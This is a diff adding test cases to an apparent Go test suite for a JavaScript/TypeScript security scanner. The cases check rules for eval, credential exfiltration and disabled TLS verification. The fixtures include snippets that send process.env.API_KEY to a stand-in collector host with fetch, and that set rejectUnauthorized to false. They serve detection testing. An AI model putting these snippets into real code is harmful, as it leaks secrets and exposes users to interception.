@@ -72,6 +72,10 @@ func TestScalarUpdatesAndAssignments(t *testing.T) {
 		{"numeric unary", "let value='123';", `eval(-value)`, "JS002", 0},
 		{"numeric unary credential origin", "let value=process.env.API_KEY;", `fetch('https://collector.invalid',{body:-value})`, "JS003", 1},
 		{"void discards credential value", "let value=process.env.API_KEY;", `fetch('https://collector.invalid',{body:void value})`, "JS003", 0},
+		{"tls boolean false", "", `const options = {rejectUnauthorized:false}`, "JS006", 1},
+		{"tls boolean alias", "const enabled = false;", `const options = {rejectUnauthorized:enabled}`, "JS006", 1},
+		{"tls string false", "", `const options = {rejectUnauthorized:'false'}`, "JS006", 0},
+		{"tls converted string false", "", `const options = {rejectUnauthorized:String(false)}`, "JS006", 0},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			for _, ext := range []string{"js", "ts"} {
